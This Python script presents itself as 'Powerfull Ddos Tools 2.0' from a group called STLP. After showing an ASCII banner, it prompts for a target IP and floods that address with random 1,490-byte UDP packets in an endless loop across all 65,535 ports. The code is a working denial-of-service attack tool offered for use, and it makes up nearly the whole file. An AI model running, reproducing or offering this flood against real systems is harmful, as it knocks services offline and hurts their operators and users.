import socket
import random
import os
import time

# ===================== Banner Function =====================
def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    # pyfiglet দিয়ে DDOS লেখার ASCII Art, lolcat দিয়ে রঙিন করা
    os.system('figlet -f slant "DDOS" | lolcat')
    print("\033[93m" + "="*50 + "\033[0m")
    print("\033[91m🔥 Author : Showrab 🔥\033[0m")
    print("\033[91m🔥 Team : STLP 🔥\033[0m")
    print("\033[91m🔥 Tools : Powerfull Ddos Tools 2.0 🔥\033[0m")
    print("\033[93m" + "="*50 + "\033[0m\n")
    time.sleep(1)

# ===================== Main =====================
show_banner()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte_data = random._urandom(1490)

ip = input("\033[92mEnter Target Website IP: \033[0m")
sent = 0
port = 0

while True:
    port += 1
    sock.sendto(byte_data, (ip, port))
    sent += 1
    print(f"\033[96m[+] Connection Timeout {sent} in {ip} Through port {port}\033[0m")
    if port == 65535:
        port = 0